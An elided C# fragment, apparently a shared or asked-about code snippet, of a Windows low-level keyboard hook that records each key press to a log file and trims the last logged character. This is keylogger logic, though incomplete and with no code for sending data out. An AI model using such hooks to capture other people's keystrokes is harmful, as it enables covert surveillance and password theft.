    ...
    class Program
    {
        ...
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            ...
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                ...
                {
                    using (FileStream fs = new FileStream(LOG_FILE_NAME, FileMode.Open))
                    {
                        fs.Position = fs.Seek(-1, SeekOrigin.End);
                        fs.SetLength(fs.Length - 1);
                    }

                    //Console.Out.Write(lastLine.Substring(lastLine.Count()-2, lastLine.Count()-1));
                }
                ...
                {
                    String key = Program.VerifyKey(vkCode);
                    //Console.Out.Write("Test: " + key);
